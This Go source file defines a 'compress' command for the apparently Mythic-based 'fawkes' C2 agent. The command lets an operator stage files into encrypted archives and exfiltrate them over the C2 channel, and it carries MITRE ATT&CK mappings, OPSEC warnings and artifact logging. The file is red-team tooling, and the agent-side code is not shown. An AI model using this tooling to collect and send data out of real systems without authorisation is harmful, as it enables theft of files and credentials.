package agentfunctions

import (
	"encoding/json"
	"fmt"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "compress",
		Description:         "Create, list, extract, stage, or exfil encrypted archives. Stage collects files into AES-256-GCM encrypted archives. Exfil transfers staged archives to Mythic with integrity verification. Stage-exfil combines both in one step.",
		HelpString:          "compress -action create|list|extract|stage|exfil|stage-exfil -path <dir_or_file> [-format zip|tar.gz] [-output path] [-pattern *.txt] [-cleanup true]",
		Version:             3,
		MitreAttackMappings: []string{"T1560.001", "T1074.001", "T1041", "T1048"}, // Archive, Data Staging, Exfil Over C2, Exfil Over Alt Protocol
		Author:              "@galoryber",
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS, agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "action",
				CLIName:       "action",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:   "Action to perform",
				Choices:       []string{"create", "list", "extract", "stage", "exfil", "stage-exfil"},
				DefaultValue:  "create",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     1,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "path",
				CLIName:       "path",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:   "Source path (file or directory for create, zip file for list/extract)",
				DefaultValue:  "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     2,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "output",
				CLIName:       "output",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:   "Output path (zip file for create, directory for extract). Auto-generated if omitted.",
				DefaultValue:  "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     3,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "format",
				CLIName:       "format",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:   "Archive format. Auto-detected from file extension for list/extract.",
				Choices:       []string{"zip", "tar.gz"},
				DefaultValue:  "zip",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     4,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "pattern",
				CLIName:       "pattern",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:   "Glob pattern to filter files (e.g. *.txt, *.docx, password*)",
				DefaultValue:  "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     5,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "max_depth",
				CLIName:       "max_depth",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:   "Maximum directory recursion depth (default: 10)",
				DefaultValue:  10,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     6,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "max_size",
				CLIName:       "max_size",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:   "Skip files larger than this (bytes, default: 104857600 = 100MB)",
				DefaultValue:  104857600,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     7,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "cleanup",
				CLIName:       "cleanup",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				Description:   "Auto-delete staged archive after successful exfil transfer (default: false)",
				DefaultValue:  false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     8,
						GroupName:            "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input != "" {
				return args.LoadArgsFromJSONString(input)
			}
			return nil
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			msg := "OPSEC WARNING: Compressing files for staging/exfiltration (T1560.001). Bulk file compression into archives is a data staging indicator."
			switch action {
			case "stage":
				msg = "OPSEC WARNING: Data staging with AES-256-GCM encryption (T1074.001 + T1560.001). Creates encrypted archive in temp directory. Disk write of encrypted archive may trigger DLP or endpoint monitoring. The encryption key is returned in task output — protect it."
			case "exfil":
				msg = "OPSEC WARNING: Exfiltrating staged archive over C2 channel (T1041). Large file transfers create detectable network egress patterns. File is transferred in 512KB chunks. Consider transfer timing and volume."
			case "stage-exfil":
				msg = "OPSEC WARNING: Combined data staging + exfiltration (T1074.001 + T1041). Collects files into AES-256-GCM encrypted archive, then transfers to Mythic. Creates both disk and network artifacts. Archive is auto-deleted after transfer."
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID: taskData.Task.ID, Success: true,
				OpsecPreBlocked: false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			// Detect stage action output (JSON with encryption_key field)
			var stageResult struct {
				ArchivePath string `json:"archive_path"`
				FileCount   int    `json:"file_count"`
				ArchiveSize int64  `json:"archive_size"`
				SourcePath  string `json:"source_path"`
			}
			if err := json.Unmarshal([]byte(responseText), &stageResult); err == nil && stageResult.ArchivePath != "" && stageResult.FileCount > 0 {
				createArtifact(processResponse.TaskData.Task.ID, "File Write",
					fmt.Sprintf("Encrypted staging archive: %s (%d files, %d bytes) from %s",
						stageResult.ArchivePath, stageResult.FileCount, stageResult.ArchiveSize, stageResult.SourcePath))
				logOperationEvent(processResponse.TaskData.Task.ID,
					fmt.Sprintf("[DATA STAGING] compress stage: %d files (%d bytes) staged to %s from %s",
						stageResult.FileCount, stageResult.ArchiveSize, stageResult.ArchivePath, stageResult.SourcePath), true)
				tagTask(processResponse.TaskData.Task.ID, "DATA_STAGED",
					fmt.Sprintf("Encrypted staging: %d files (%d bytes) at %s",
						stageResult.FileCount, stageResult.ArchiveSize, stageResult.ArchivePath))
			}
			// Detect exfil action output (JSON with sha256 and status fields)
			var exfilResult struct {
				ArchivePath string `json:"archive_path"`
				FileSize    int64  `json:"file_size"`
				SHA256      string `json:"sha256"`
				CleanedUp   bool   `json:"cleaned_up"`
				Status      string `json:"status"`
			}
			if err := json.Unmarshal([]byte(responseText), &exfilResult); err == nil && exfilResult.Status == "transferred" {
				createArtifact(processResponse.TaskData.Task.ID, "Network Connection",
					fmt.Sprintf("Exfiltrated archive: %s (%d bytes, SHA-256: %s)",
						exfilResult.ArchivePath, exfilResult.FileSize, exfilResult.SHA256))
				logOperationEvent(processResponse.TaskData.Task.ID,
					fmt.Sprintf("[EXFILTRATION] compress exfil: %d bytes transferred from %s (SHA-256: %s, cleanup: %v)",
						exfilResult.FileSize, exfilResult.ArchivePath, exfilResult.SHA256, exfilResult.CleanedUp), true)
				tagTask(processResponse.TaskData.Task.ID, "EXFILTRATED",
					fmt.Sprintf("Exfil: %d bytes from %s", exfilResult.FileSize, exfilResult.ArchivePath))
			}
			// Detect stage-exfil combined output (JSON with encryption_key + status)
			var stageExfilResult struct {
				FileCount     int    `json:"file_count"`
				ArchiveSize   int64  `json:"archive_size"`
				SourcePath    string `json:"source_path"`
				ArchiveSHA256 string `json:"archive_sha256"`
				Status        string `json:"status"`
				CleanedUp     bool   `json:"cleaned_up"`
			}
			if err := json.Unmarshal([]byte(responseText), &stageExfilResult); err == nil && stageExfilResult.Status == "staged_and_transferred" {
				createArtifact(processResponse.TaskData.Task.ID, "Network Connection",
					fmt.Sprintf("Staged+exfiltrated: %d files (%d bytes) from %s (SHA-256: %s)",
						stageExfilResult.FileCount, stageExfilResult.ArchiveSize, stageExfilResult.SourcePath, stageExfilResult.ArchiveSHA256))
				logOperationEvent(processResponse.TaskData.Task.ID,
					fmt.Sprintf("[DATA STAGING + EXFILTRATION] compress stage-exfil: %d files (%d bytes) from %s transferred (cleanup: %v)",
						stageExfilResult.FileCount, stageExfilResult.ArchiveSize, stageExfilResult.SourcePath, stageExfilResult.CleanedUp), true)
				tagTask(processResponse.TaskData.Task.ID, "EXFILTRATED",
					fmt.Sprintf("Stage+exfil: %d files (%d bytes) from %s",
						stageExfilResult.FileCount, stageExfilResult.ArchiveSize, stageExfilResult.SourcePath))
			}
			return response
		},
		TaskFunctionCreateTasking: func(task *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  task.Task.ID,
			}
			if displayParams, err := task.Args.GetFinalArgs(); err == nil && displayParams != "" {
				response.DisplayParams = &displayParams
			}
			path, _ := task.Args.GetStringArg("path")
			createArtifact(task.Task.ID, "File Write", fmt.Sprintf("File compression of %s", path))
			return response
		},
	})
}
